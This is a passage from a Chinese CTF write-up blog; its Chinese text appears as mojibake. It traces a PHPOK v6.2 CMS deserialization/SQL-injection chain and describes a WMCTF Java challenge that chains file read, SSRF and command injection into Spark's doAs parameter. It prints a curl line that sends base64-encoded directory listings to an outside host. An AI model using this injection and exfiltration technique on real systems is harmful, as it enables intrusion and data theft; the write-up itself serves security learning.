class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">public function index_f()</span><br><span class="line">&#123;</span><br><span class="line">	$data = $this-&gt;get(&#x27;data&#x27;,&#x27;html&#x27;);</span><br><span class="line">	...</span><br><span class="line">	if(substr($data,0,1) == &#x27;&#123;&#x27;)&#123;</span><br><span class="line">		$data = $this-&gt;lib(&#x27;json&#x27;)-&gt;decode(stripslashes($data)); //è§£æjsonï¼Œå†™æˆé”®å€¼å¯¹</span><br><span class="line">		if($data)&#123;</span><br><span class="line">			$data = $this-&gt;format($data);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		...</span><br><span class="line">	&#125;</span><br><span class="line">	//åŸºäºæ¥å£ç¦ç”¨SQL</span><br><span class="line">	$is_error = false;</span><br><span class="line">	foreach($data as $key=&gt;$value)&#123;</span><br><span class="line">		if(isset($value[&#x27;type_id&#x27;]))&#123; //$key = &quot;m_picplayer&quot; $value=&quot;0&amp;type_id=format_ext_all....&quot;</span><br><span class="line">			$is_error = true;</span><br><span class="line">			break;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	if($is_error)&#123;</span><br><span class="line">		$this-&gt;error(P_Lang(&#x27;ç³»ç»Ÿç¦æ­¢æ”¹å†™ç±»å‹å‚æ•°&#x27;));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$call_all = $this-&gt;model(&#x27;call&#x27;)-&gt;all($this-&gt;site[&#x27;id&#x27;],&#x27;identifier&#x27;);</span><br><span class="line">	$is_ok = false;</span><br><span class="line">	$rslist = array();</span><br><span class="line">	foreach($data as $key=&gt;$value)&#123;</span><br><span class="line">		//æ£€æŸ¥ç³»ç»Ÿæ˜¯å¦æœ‰å¼€æ”¾SQLè°ƒç”¨</span><br><span class="line">		...</span><br><span class="line">		//æ˜æ–‡ä¼ è¾“å°†ç¦ç”¨sqlextå’Œsqlinfo</span><br><span class="line">		if(isset($value[&#x27;sqlext&#x27;]))&#123;</span><br><span class="line">			unset($value[&#x27;sqlext&#x27;]);</span><br><span class="line">		&#125;</span><br><span class="line">		if(isset($value[&#x27;sqlinfo&#x27;]))&#123;</span><br><span class="line">			unset($value[&#x27;sqlinfo&#x27;]);</span><br><span class="line">		&#125;</span><br><span class="line">		if($call_all &amp;&amp; $call_all[$key] &amp;&amp; $call_all[$key][&#x27;is_api&#x27;])&#123; // $call_all[$key][&#x27;is_api&#x27;] = 1</span><br><span class="line">			$tmpValue = $value;</span><br><span class="line">			$fid = $key;</span><br><span class="line">			..</span><br><span class="line">			$rslist[$fid] = phpok($key,$tmpValue); // å…³é”®ç‚¹ -&gt; framework/phpok_tpl_helper.php</span><br><span class="line">			$is_ok = true;</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">			...</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>framework/phpok_tpl_helper.php#phpok($id=&#39;&#39;,$ext=&quot;&quot;)</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function phpok($id=&#x27;&#x27;,$ext=&quot;&quot;) // $ext=&quot;0&amp;type_id=format_ext_all....&quot; $id=&quot;m_picplayer&quot;</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">	$count = func_num_args();</span><br><span class="line">	if($count&lt;=2)&#123;</span><br><span class="line">		return $GLOBALS[&#x27;app&#x27;]-&gt;call-&gt;phpok($id,$ext); // å…³é”® -&gt; framework/phpok_call.php</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>framework/phpok_call.php#phpok($id,$rs=&quot;&quot;)</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">public function phpok($id,$rs=&quot;&quot;)</span><br><span class="line">	&#123;</span><br><span class="line">		...</span><br><span class="line">		//æ ¼å¼åŒ–å‚æ•°</span><br><span class="line">		if($rs &amp;&amp; is_string($rs))&#123;</span><br><span class="line">			parse_str($rs,$rs); //parse_str å°†å­—ç¬¦ä¸²è§£ææˆå¤šä¸ªå˜é‡</span><br><span class="line">		&#125;</span><br><span class="line">		...</span><br><span class="line">		// å‘$rsä¸­æ·»åŠ äº†ä¸¤ä¸ªå­—æ®µsiteå’Œ_baseurl</span><br><span class="line">		if(substr($id,0,1) != &#x27;_&#x27;)&#123;</span><br><span class="line">			$call_rs = $this-&gt;load_phpoklist($id,$rs[&#x27;site&#x27;]); // ä»$id=m_picplayerä¸­è·å–ä¿¡æ¯</span><br><span class="line">			...</span><br><span class="line">			if($rs &amp;&amp; is_array($rs))&#123;</span><br><span class="line">				$call_rs = array_merge($call_rs,$rs); // åé¢çš„å€¼è¦†ç›–å‰é¢çš„ï¼Œå…³é”®ç‚¹ï¼Œåˆ©ç”¨$rsä¸­çš„type_idè¦†ç›–æ‰$call_rsçš„</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">			...</span><br><span class="line">		&#125;</span><br><span class="line">		$func = &#x27;_&#x27;.$call_rs[&#x27;type_id&#x27;];</span><br><span class="line">		if(!in_array($func,$this-&gt;mlist))&#123; // $this-mlistå¯ç”¨_format_ext_allæ‰“ååºåˆ—åŒ–å’Œ_sqlæ‰“ä»»æ„sqlæ³¨å…¥ç„¶ååœ¨åˆ«å¤„è§¦å‘ååºåˆ—åŒ–</span><br><span class="line">			return false;</span><br><span class="line">		&#125;</span><br><span class="line">		...</span><br><span class="line">		return $this-&gt;$func($call_rs,$cache_id); å…³é”®ç‚¹ $func = _format_ext_all -&gt; framework/phpok_call.php $call_rs[&#x27;x&#x27;]æ˜¯æˆ‘ä»¬æ§åˆ¶çš„ååºåˆ—åŒ–æ•°æ®</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>framework/phpok_call.php#_format_ext_all($rslist)</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">private function _format_ext_all($rslist)</span><br><span class="line">&#123;</span><br><span class="line">	$res = &#x27;&#x27;;</span><br><span class="line">	foreach($rslist as $key=&gt;$value)&#123; $valueä¸ºæˆ‘ä»¬è®¾ç½®çš„xæ—¶</span><br><span class="line">		if($value[&#x27;form_type&#x27;] == &#x27;url&#x27; &amp;&amp; $value[&#x27;content&#x27;])&#123;</span><br><span class="line">			$value[&#x27;content&#x27;] = unserialize($value[&#x27;content&#x27;]); //è§¦å‘ååºåˆ—åŒ–</span><br><span class="line">			...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>åˆ°è¿™é‡Œï¼Œè¿™ä¸ªæ´è·Ÿå®Œäº†ï¼Œå®é™…ä¸Šå¹¶ä¸å¤æ‚ï¼Œå¯æƒœå½“æ—¶æ²¡æœ‰ç¯å¢ƒèƒ½çœ‹çœ‹å¤„ç†æµç¨‹ï¼Œä¸ç„¶æ„Ÿè§‰è‡ªå·±åº”è¯¥å¯ä»¥å®Œæˆè¿™ä¸ª0dayçš„å®¡è®¡çš„ï¼ä¸è¿‡ä¸€åˆ‡éƒ½åœ¨å˜å¥½ï¼Œç»§ç»­åŠªåŠ›ğŸ˜„</p>
<h1 id="WMCTF-JAVA"><a href="#WMCTF-JAVA" class="headerlink" title="WMCTF - JAVA"></a>WMCTF - JAVA</h1><blockquote>
<p>æ‡’ï¼Œå°±å†™åœ¨è¿™é‡Œäº†ï¼Œç²¾åŠ›éƒ½ç»™qwbäº†ï¼Œåªåšäº†ä¸€é“web</p>
</blockquote>
<h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>ç»™äº†ä¸ªä»»æ„æ–‡ä»¶è¯»å–ï¼Œä½†æ˜¯è¿™ä¸ªä»»æ„æ–‡ä»¶è¯»å–å¯ä»¥åˆ—ç›®å½•ï¼Œæ¯”è¾ƒç¥å¥‡ï¼Œè¯»äº†Javaçš„ç›®å½•ï¼Œæ²¡æœ‰ä»€ä¹ˆæœ‰æ„æ€çš„ä¸œè¥¿ï¼Œä½†æ˜¯åœ¨è¯»ç¯å¢ƒå˜é‡çš„æ—¶å€™ç¿»åˆ°äº†ä¸€äº›k8sçš„é…ç½®ï¼Œå°±åœ¨æƒ³æ˜¯ä¸æ˜¯è¦ssrfæ‰“å†…ç½‘ã€‚</p>
<p>è¯»å–/proc/self/cwdç›®å½•æ—¶æœ‰å¾ˆå¤štomcatçš„æ—¥å¿—ï¼Œåœ¨catalinaçš„æ—¥å¿—ä¸­ç¿»åˆ°äº†ä¸€äº›é—è½ä¿¡æ¯ï¼Œæ¯”å¦‚æ‰“äº†10.244.0.160:8080è¿™ç§ï¼Œäºæ˜¯æ”¾å¼€æ‰‹æ‰«è¿™ä¸ªcæ®µï¼ˆå…¶å®æŒ‰ç†è¯´åº”è¯¥æ˜¯ç¿»åˆ°é…ç½®ï¼Œæœ‰ä¸ª10æ®µçš„å†…ç½‘åœ°å€ï¼Œç„¶åæ‰«bæ®µçš„ï¼Œè¿™é‡Œå–å·§äº†ï¼Œå› ä¸ºçœ‹é¢˜çš„æ—¶å€™å·²ç»å¾ˆè¿Ÿäº†ï¼‰ï¼Œç„¶åæ‰«åˆ°äº†spark</p>
<p>åœ¨ssrfç‚¹è¿‡æ»¤äº†åå¼•å·ï¼Œåå¼•å·çš„urlç¼–ç ï¼Œåå¼•å·urlç¼–ç çš„urlç¼–ç ï¼Œæœäº†ä¸‹è¿™ä¸ªæ´ï¼Œè§¦å‘ç‚¹åœ¨doAså‚æ•°ï¼Œè¿™ä¸ªå‚æ•°ç›´æ¥åˆå¹¶åˆ°<code>/bin/bash -c &quot;id -Gn å‚æ•°&quot;</code>ä¸­ï¼Œå‘½ä»¤æ‹¼æ¥ä¸€ä¸‹å°±è¡Œï¼Œäºæ˜¯åœ¨vpsä¸Šç›‘å¬ï¼Œç”¨;åšä¸€ä¸‹åˆ†å‰²å°±å¯ä»¥ï¼ˆæ³¨æ„payloadéœ€è¦ä¸¤æ¬¡urlç¼–ç ï¼Œä¸€æ¬¡æ˜¯ssrfäºŒæ¬¡æ˜¯å†…ç½‘webæœåŠ¡ï¼‰,payloadå¦‚ä¸‹</p>
<p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20220822191901305.png" alt="image-20220822191901305"></p>
<p>è¿™é‡Œç¯å¢ƒæ¯”è¾ƒå‘ï¼Œæˆ‘åœ¨ç¾ä¸½å›½çš„vpsæ”¶ä¸åˆ°ï¼Œä½†æ˜¯å›½å†…çš„vpsç‚¹å‡»å°±ä¸Šï¼Œå½“æ—¶æŠ˜è…¾äº†å¥½ä¹…ï¼Œè®°å½•ä¸‹curlå¤–å¸¦</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;curl -d &quot;x=$(ls /|base64)&quot; http://8.8.8.8</span><br></pre></td></tr></table></figure>


  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/paper/">Paper</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#QWB-FINAL-CMS-PHPOK-v6-2"><span class="toc-number">1.</span> <span class="toc-text">QWB FINAL - CMS (PHPOK v6.2)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text">ç¯å¢ƒé…ç½®</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">1.2.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Track-It"><span class="toc-number">1.3.</span> <span class="toc-text">Track It</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.4.</span> <span class="toc-text">æ€»ç»“</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WMCTF-JAVA"><span class="toc-number">2.</span> <span class="toc-text">WMCTF - JAVA</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">2.1.</span> <span class="toc-text">æ€è·¯</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/&text=NS - QWB FINAL &amp;&amp; WMCTF WEB"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/&title=NS - QWB FINAL &amp;&amp; WMCTF WEB"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/&is_video=false&description=NS - QWB FINAL &amp;&amp; WMCTF WEB"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=NS - QWB FINAL &amp;&amp; WMCTF WEB&body=Check out this article: http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/&title=NS - QWB FINAL &amp;&amp; WMCTF WEB"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/&title=NS - QWB FINAL &amp;&amp; WMCTF WEB"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/&title=NS - QWB FINAL &amp;&amp; WMCTF WEB"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/&title=NS - QWB FINAL &amp;&amp; WMCTF WEB"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/&name=NS - QWB FINAL &amp;&amp; WMCTF WEB&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/&t=NS - QWB FINAL &amp;&amp; WMCTF WEB"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <!-- <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script> -->

    <div class="footer-center">
      Copyright &copy;
      
      
      2021-2022
      Powered by
      outx
      <!-- (<span id="busuanzi_value_site_pv"></span>) -->
    </div>
  
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/paper/">Paper</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </nav>
  </div>
  <br>

</footer>


    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->


</body>
</html>
